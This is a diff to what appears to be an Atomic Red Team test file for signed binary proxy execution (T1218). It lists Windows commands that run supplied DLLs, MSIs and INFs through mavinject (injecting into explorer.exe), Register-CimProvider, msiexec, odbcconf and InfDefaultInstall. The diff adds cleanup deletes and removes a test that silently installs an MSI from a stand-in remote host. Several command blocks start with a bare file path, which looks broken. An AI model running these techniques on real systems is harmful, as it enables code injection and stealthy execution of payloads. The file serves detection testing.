@@ -26,6 +26,7 @@ atomic_tests:
       /atomics/T1218/src/x64/T1218.dll
       $proc_id = (Get-Process explorer).Id
       mavinject.exe $proc_id /INJECTRUNNING #{dll_payload}
+      Remove-Item #{dll_payload}
 
 - name: SyncAppvPublishingServer - Execute arbitrary PowerShell code
   description: |
@@ -55,46 +56,13 @@ atomic_tests:
     dll_payload:
       description: DLL to execute
       type: Path
-      default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
+      default: T1218-2.dll
   executor:
     name: command_prompt
     command: |
      /atomics/T1218/src/Win32/T1218-2.dll
      C:\Windows\SysWow64\Register-CimProvider.exe -Path #{dll_payload}
-
-- name: Msiexec.exe - Execute Local MSI file
-  description: |
-    Execute arbitrary MSI file. Commonly seen in application installation.
-
-  supported_platforms:
-    - windows
-
-  input_arguments:
-    msi_payload:
-      description: MSI file to execute
-      type: Path
-      default: PathToAtomicsFolder\T1218\src\Win32\T1218.msi
-  executor:
-    name: command_prompt
-    command: |
-     msiexec.exe /q /i "#{msi_payload}"
-
-- name: Msiexec.exe - Execute Remote MSI file
-  description: |
-    Execute arbitrary MSI file retrieved remotely. Less commonly seen in application installation, commonly seen in malware execution.
-
-  supported_platforms:
-    - windows
-
-  input_arguments:
-    msi_payload:
-      description: MSI file to execute
-      type: String
-      default: http://site.com/file.msi
-  executor:
-    name: command_prompt
-    command: |
-     msiexec.exe /q /i "#{msi_payload}"
+     del #{dll_payload}
 
 - name: Msiexec.exe - Execute Arbitrary DLL
   description: |
@@ -113,6 +81,7 @@ atomic_tests:
     command: |
      /atomics/T1218/src/x64/T1218.dll
      msiexec.exe /y "#{dll_payload}"
+     del #{dll_payload}
 
 - name: Odbcconf.exe - Execute Arbitrary DLL
   description: |
@@ -131,6 +100,7 @@ atomic_tests:
     command: |
      /atomics/T1218/src/x64/T1218.dll
      odbcconf.exe /S /A {REGSVR "#{dll_payload}"}
+     del #{dll_payload}
 
 - name: InfDefaultInstall.exe .inf Execution
   description: |
@@ -149,3 +119,4 @@ atomic_tests:
     command: |
       /atomics/T1218/src/Infdefaultinstall.inf
       InfDefaultInstall.exe #{inf_to_execute}
+      del #{inf_to_execute}
